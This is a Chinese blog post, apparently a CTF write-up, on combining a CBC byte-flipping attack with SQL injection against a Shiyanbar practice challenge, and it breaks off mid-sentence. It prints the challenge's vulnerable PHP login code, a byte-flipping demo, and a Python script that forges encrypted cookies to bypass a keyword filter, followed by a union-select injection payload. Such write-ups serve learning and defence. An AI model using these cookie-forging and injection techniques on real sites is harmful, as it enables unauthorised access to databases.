<!DOCTYPE html><html class="theme-next muse use-motion" lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="theme-color" content="#222"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"><link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css"><link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css"><link rel="apple-touch-icon" sizes="180x180" href="/images/title.png?v=5.1.4"><link rel="icon" type="image/png" sizes="32x32" href="/images/title.png?v=5.1.4"><link rel="icon" type="image/png" sizes="16x16" href="/images/title.png?v=5.1.4"><link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222"><meta name="keywords" content="密码,sql注入,实验吧,"><meta name="description" content="题目来源题目链接该题目的出发点是通过注入拿到flag，sql注入结果的回显是在show_homepage函数里，上溯使该回显生效需要满足以下几个条件：首先存在cipher和iv两个cookie值变量$plain可以通过openssl解密解密后的结果能够组成恶意SQL查询语句（如把 ++$info[‘id’]++ 后面的 ++”,0”;++ 注释掉剩下就是构造sql查询的问题了"><meta name="keywords" content="密码,sql注入,实验吧"><meta property="og:type" content="article"><meta property="og:title" content="学习笔记（20180815）:字节翻转攻击与sql注入拿flag"><meta property="og:url" content="http://leeswi.github.io/2018/12/05/学习笔记（20180815）：字节翻转攻击与sql注入拿flag/index.html"><meta property="og:site_name" content="Sing1e-D0g的笔记"><meta property="og:description" content="题目来源题目链接该题目的出发点是通过注入拿到flag，sql注入结果的回显是在show_homepage函数里，上溯使该回显生效需要满足以下几个条件：首先存在cipher和iv两个cookie值变量$plain可以通过openssl解密解密后的结果能够组成恶意SQL查询语句（如把 ++$info[‘id’]++ 后面的 ++”,0”;++ 注释掉剩下就是构造sql查询的问题了"><meta property="og:locale" content="zh-Hans"><meta property="og:image" content="https://gss0.bdstatic.com/94o3dSag_xI4khGkpoWK1HF6hhy/baike/c0%3Dbaike80%2C5%2C5%2C80%2C26/sign=e47ca768359b033b3885f48874a75db6/6609c93d70cf3bc7af6b7780d000baa1cd112a76.jpg"><meta property="og:updated_time" content="2018-12-05T15:11:43.339Z"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="学习笔记（20180815）:字节翻转攻击与sql注入拿flag"><meta name="twitter:description" content="题目来源题目链接该题目的出发点是通过注入拿到flag，sql注入结果的回显是在show_homepage函数里，上溯使该回显生效需要满足以下几个条件：首先存在cipher和iv两个cookie值变量$plain可以通过openssl解密解密后的结果能够组成恶意SQL查询语句（如把 ++$info[‘id’]++ 后面的 ++”,0”;++ 注释掉剩下就是构造sql查询的问题了"><meta name="twitter:image" content="https://gss0.bdstatic.com/94o3dSag_xI4khGkpoWK1HF6hhy/baike/c0%3Dbaike80%2C5%2C5%2C80%2C26/sign=e47ca768359b033b3885f48874a75db6/6609c93d70cf3bc7af6b7780d000baa1cd112a76.jpg"><script type="text/javascript" id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Muse",version:"5.1.4",sidebar:{position:"left",display:"post",offset:12,b2t:!1,scrollpercent:!1,onmobile:!1},fancybox:!0,tabs:!0,motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},duoshuo:{userId:"0",author:"博主"},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><link rel="canonical" href="http://leeswi.github.io/2018/12/05/学习笔记（20180815）：字节翻转攻击与sql注入拿flag/"><title>学习笔记（20180815）:字节翻转攻击与sql注入拿flag | Sing1e-D0g的笔记</title></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans"><div class="container sidebar-position-left page-post-detail"><div class="headband"></div><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">Sing1e-D0g的笔记</span> <span class="logo-line-after"><i></i></span></a></div><p class="site-subtitle"></p></div><div class="site-nav-toggle"><button><span class="btn-bar"></span> <span class="btn-bar"></span> <span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i><br>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i><br>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i><br>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br>归档</a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="menu-item-icon fa fa-fw fa-calendar"></i><br>日程表</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i><br>站点地图</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="menu-item-icon fa fa-fw fa-heartbeat"></i><br>公益404</a></li></ul></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><div id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://leeswi.github.io/2018/12/05/学习笔记（20180815）：字节翻转攻击与sql注入拿flag/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Sing1e-D0g"><meta itemprop="description" content=""><meta itemprop="image" content="/images/header.jpg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Sing1e-D0g的笔记"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">学习笔记（20180815）:字节翻转攻击与sql注入拿flag</h1><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-05T22:44:49+08:00">2018-12-05 </time></span><span class="post-category"><span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-folder-o"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a></span></span></div></header><div class="post-body" itemprop="articleBody"><h2 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h2><p><a href="http://www.shiyanbar.com/ctf/2037" target="_blank" rel="noopener">题目链接</a></p><p>该题目的出发点是通过注入拿到flag，sql注入结果的回显是在show_homepage函数里，上溯使该回显生效需要满足以下几个条件：</p><ol><li>首先存在cipher和iv两个cookie值</li><li>变量$plain可以通过openssl解密</li><li>解密后的结果能够组成恶意SQL查询语句（如把 ++$info[‘id’]++ 后面的 ++”,0”;++ 注释掉</li><li>剩下就是构造sql查询的问题了<a id="more"></a> 主要问题就在2、3上面。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="string">'***********'</span>);</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'conn.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqliCheck</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/\\\|,|-|#|=|~|union|like|procedure/i"</span>,$str))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    setcookie(<span class="string">"iv"</span>, base64_encode($iv));</span><br><span class="line">    setcookie(<span class="string">"cipher"</span>, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $link;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[<span class="string">'cipher'</span>]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[<span class="string">"iv"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode($plain).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);  <span class="comment">//info[id]为plain反序列化结果，plain可以正确解密</span></span><br><span class="line">            $sql=<span class="string">"select * from users limit "</span>.$info[<span class="string">'id'</span>].<span class="string">",0"</span>;  <span class="comment">//info['id']处可以注入，往上寻找来源</span></span><br><span class="line">            $result=mysqli_query($link,$sql);</span><br><span class="line">            <span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>  <span class="keyword">or</span> <span class="keyword">die</span>(mysqli_error($link)))&#123;</span><br><span class="line">                $rows=mysqli_fetch_array($result);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;h1&gt;&lt;center&gt;Hello!'</span>.$rows[<span class="string">'username'</span>].<span class="string">'&lt;/center&gt;&lt;/h1&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    $id = (string)$_POST[<span class="string">'id'</span>];  <span class="comment">//将输入转为字符串格式</span></span><br><span class="line">    <span class="keyword">if</span>(sqliCheck($id))  <span class="comment">//检查关键字防止sql注入</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;h1 style='color:red'&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;"</span>);</span><br><span class="line">    $info = <span class="keyword">array</span>(<span class="string">'id'</span>=&gt;$id);</span><br><span class="line">    login($info);  <span class="comment">//进入登陆界面并显示数据库查询信息</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;'</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">"iv"</span>])&amp;&amp;<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]))&#123;</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;body class="login-body" style="margin:0 auto"&gt;</span></span><br><span class="line"><span class="string">                &lt;div id="wrapper" style="margin:0 auto;width:800px;"&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name="login-form" class="login-form" action="" method="post"&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="header"&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;input id to login&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="content"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="id" type="text" class="input id" value="id" onfocus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="footer"&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;&lt;input type="submit" name="submit" value="Login" class="button" /&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="首先了解几个概念"><a href="#首先了解几个概念" class="headerlink" title="首先了解几个概念"></a>首先了解几个概念</h2><h3 id="1-CBC"><a href="#1-CBC" class="headerlink" title="1. CBC"></a>1. CBC</h3><p>全名密码分组链接，在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。</p><p>下图是CBC加解密的图解：<br><img src="https://gss0.bdstatic.com/94o3dSag_xI4khGkpoWK1HF6hhy/baike/c0%3Dbaike80%2C5%2C5%2C80%2C26/sign=e47ca768359b033b3885f48874a75db6/6609c93d70cf3bc7af6b7780d000baa1cd112a76.jpg" alt="image"></p><h3 id="2-aes-128-cbc加解密"><a href="#2-aes-128-cbc加解密" class="headerlink" title="2. aes-128-cbc加解密"></a>2. aes-128-cbc加解密</h3><p>题目中给的是aes-128-cbc，对应上面cbc的概念不难理解，这里的AES-128就是将Ciphertext以128bits为一组（8位=1字节），128bit==16Byte，意思就是明文的16字节为一组对应加密后的16字节的密文。AES的cbc模式就是用++初始向量和密钥++加密第一组数据，然后把第一组数据加密后的密文重新赋值给IV，然后进行第二组加密，循环进行直到结束（结合图片理解），最后将IV和加密后的密文拼接在一起，得到最终的密文。</p><ul><li>若最后剩余的明文不够16字节，需要进行填充，通常采用PKCS7进行填充。比如最后缺3个字节，则填充3个字节的0x03;若最后缺10个字节，则填充10个字节的0x0a;</li><li>若明文正好是16个字节的整数倍，最后要再加入一个16字节0x10的组再进行加密</li></ul><p>cbc解密的话先从密文中提取出IV，然后将密文分组，然后使用密钥对第一组的密文解密，然后和IV进行xor得到明文。使用密钥对第二组密文解密，然后和2中的密文xor得到明文。<br>重复前两个步骤，直到最后一组密文。</p><ul><li><strong>要强调的是：分块解密时，每块产生的plaintext（明文）只与前一块的ciphertext和key有关</strong></li></ul><h3 id="3-字节翻转攻击"><a href="#3-字节翻转攻击" class="headerlink" title="3. 字节翻转攻击"></a>3. 字节翻转攻击</h3><p>字节反转攻击的目的在于控制解密产生的明文，方法就是改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。</p><p>A=ciphertext(N-1),B=plaintext(N),C为第N块待异或且经过解密的字符，C’为我们经过翻转要得到的明文。A’为修改后的密文。</p><p>简单计算，我们可以得到以下关系：</p><p>A = B ^ C</p><p>C = A ^ B</p><p>A ^ B ^ C = 0</p><p>A ^ B ^ C ^ C’ = C’</p><p>目的是得到C’，根据关系式可以得到 A’ = A ^ C ^ C’，让A’和B去异或得到C’</p><h2 id="测试脚本"><a href="#测试脚本" class="headerlink" title="测试脚本"></a>测试脚本</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'MY_AES_KEY'</span>, <span class="string">"abcdef0123456789"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes</span><span class="params">($data, $encrypt, $iv)</span> </span>&#123;</span><br><span class="line">    $aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, <span class="string">''</span>, MCRYPT_MODE_CBC, <span class="string">''</span>);</span><br><span class="line">    mcrypt_generic_init($aes, MY_AES_KEY, $iv);</span><br><span class="line">    <span class="keyword">return</span> $encrypt ? mcrypt_generic($aes, $data) : mdecrypt_generic($aes, $data);</span><br><span class="line">&#125;</span><br><span class="line">define(<span class="string">'MY_MAC_LEN'</span>, <span class="number">40</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data, $iv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> aes($data, <span class="keyword">true</span>, $iv);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($data, $iv)</span> </span>&#123;</span><br><span class="line">    $data = rtrim(aes($data, <span class="keyword">false</span>, $iv) , <span class="string">"\0"</span>);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">$v = <span class="string">"a:2:&#123;s:4:\"name\";s:6:\"sdsdsd\";s:8:\"greeting\";s:20:\"echo 'Hello sdsdsd!'\";&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Plaintext before attack: $v\n"</span>;</span><br><span class="line">$b = <span class="keyword">array</span>();</span><br><span class="line">$enc = <span class="keyword">array</span>();</span><br><span class="line">$enc = @encrypt($v, <span class="string">"1234567891234567"</span>);</span><br><span class="line"><span class="keyword">echo</span> ord($enc[<span class="number">15</span>]) . PHP_EOL;</span><br><span class="line">$enc[<span class="number">15</span>] = chr(ord($enc[<span class="number">15</span>]) ^ ord(<span class="string">"8"</span>) ^ ord(<span class="string">"7"</span>)); <span class="comment">//$enc[15]是指将第二个加密快第16个字节（一个字符为一个字节）也就是s的8变为7</span></span><br><span class="line">$b = @decrypt($enc, <span class="string">"1234567891234567"</span>);</span><br><span class="line"><span class="comment">//$b为第一次解密结果，有乱码，原因是被修改的加密块无法正确恢复</span></span><br><span class="line">$iv=<span class="string">"1234567891234567"</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)</span><br><span class="line">	&#123;</span><br><span class="line">		$iv[$i] = chr(ord($b[$i]) ^ ord($iv[$i]) ^ ord($v[$i]));</span><br><span class="line">	&#125;</span><br><span class="line">$c = <span class="keyword">array</span>();</span><br><span class="line">$c = @decrypt($enc,$iv);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Plaintext Third attack : $c\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h2><p><strong>题目中要想注入成功，必须字符末尾有#号将后面内容注释，因此要通过字节翻转攻击修改密文来达到解密后的明文最后一个字节为#</strong></p><p>经过分析源代码，我们知道密文为cookie里的cipher，原始向量为iv，经过URL编码和base64编码。</p><p>构造如下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> unquote,quote</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/jiandan/index.php'</span></span><br><span class="line"></span><br><span class="line">data = &#123;&#125;</span><br><span class="line"></span><br><span class="line">id = <span class="string">'12'</span> <span class="comment">#输入的值</span></span><br><span class="line"></span><br><span class="line">submit = <span class="string">'Login'</span></span><br><span class="line"></span><br><span class="line">data[<span class="string">'id'</span>]=id</span><br><span class="line">data[<span class="string">'submit'</span>]=submit</span><br><span class="line"></span><br><span class="line">r = requests.post(url,data)</span><br><span class="line"></span><br><span class="line">iv=base64.b64decode(unquote(r.cookies[<span class="string">'iv'</span>]))</span><br><span class="line">cipher=list(base64.b64decode(unquote(r.cookies[<span class="string">'cipher'</span>])))</span><br><span class="line">plain_1 = <span class="string">"a:1:&#123;s:2:\"id\";s:"</span></span><br><span class="line">plain_2 = <span class="string">"2:\"12\";&#125;"</span></span><br><span class="line">cipher[<span class="number">4</span>]=chr(ord(cipher[<span class="number">4</span>]) ^ ord(<span class="string">"2"</span>) ^ ord(<span class="string">"#"</span>))<span class="comment">#套用公式，把字符转为ASCII码才能进行异或。4的意思是把第二块第5个字节即2变为#</span></span><br><span class="line"></span><br><span class="line">cipher_new = <span class="string">""</span>.join(cipher)</span><br><span class="line">cipher_new = quote(base64.b64encode(cipher_new))</span><br><span class="line"></span><br><span class="line">cookies =dict(iv=r.cookies[<span class="string">'iv'</span>],cipher=cipher_new)</span><br><span class="line">rr = requests.get(url,cookies=cookies)</span><br><span class="line"></span><br><span class="line"><span class="comment">#修复第一块乱码问题</span></span><br><span class="line">plain_base64=re.findall(<span class="string">"base64_decode\(\'(.*?)\'\)"</span>,rr.content)[<span class="number">0</span>] <span class="comment">#查找结果后返回的解密值</span></span><br><span class="line">plain_base64=base64.b64decode(plain_base64)</span><br><span class="line">iv = list(iv)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">	iv[i] = chr(ord(plain_base64[i]) ^ ord(iv[i]) ^ ord(plain_1[i]));</span><br><span class="line">iv_new = <span class="string">""</span>.join(iv)</span><br><span class="line">iv_new = quote(base64.b64encode(iv_new))</span><br><span class="line"></span><br><span class="line">cookies_2 =dict(iv=iv_new,cipher=cipher_new)</span><br><span class="line">rrr = requests.get(url,cookies=cookies_2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> rrr.content</span><br></pre></td></tr></table></figure><p>得到的结果：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>Hello!rootzz<span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>说明有效，下一步构造注入的payload。回到题目泄露的源代码，涉及到数据库查询的一行是这个：<br></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql="<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="string">".$info['id']."</span>,<span class="number">0</span><span class="string">";</span></span><br></pre></td></tr></table></figure><p></p><p>要想构造成功，首先了解一下limit的用法：</p><hr><h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h3><p>LIMIT是MySQL内置函数，<strong>其作用是用于限制查询结果的条数。</strong></p><p>其语法格式如下:</p><ul><li>LIMIT [位置偏移量,] 行数</li></ul><p>位置偏移量是指MySQL查询分析器要从哪一行开始显示，索引值从0开始，即第一条记录位置偏移量是0，第二条记录的位置偏移量是1,依此类推…，第二个参数为“行数”即指示返回的记录条数。位置偏移量可以理解为跳过前xx条记录(元组).</p><ul><li><p>示例1：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> YourTableName <span class="keyword">LIMIT</span> <span class="number">4</span>; <span class="comment">#返回查询结果的前四条</span></span><br></pre></td></tr></table></figure></li><li><p>示例2：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> YourTableName <span class="keyword">LIMIT</span> <span class="number">2</span>,<span class="number">4</span>; <span class="comment">#从第三条起向后查询四条</span></span><br></pre></td></tr></table></figure></li></ul><p>回到题目中，id变量后面跟了一个”,0”，这个查询语句正常输入无论如何也不会输出东西，因为查询数量是0。</p><hr><p>回到题目，代码过滤了#、union，对于#，还有一种办法可以达到，即用chr(0)替代。<a href="https://zhidao.baidu.com/question/49816432.html" target="_blank" rel="noopener">详见链接</a></p><p>union可以通过字节反转攻击的方式绕过，所以形成类似以下的payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span> <span class="number">2</span>nion <span class="keyword">select</span> * <span class="keyword">from</span>((<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b);'+chr(0)</span><br></pre></td></tr></table></figure><p>解释一下，limit 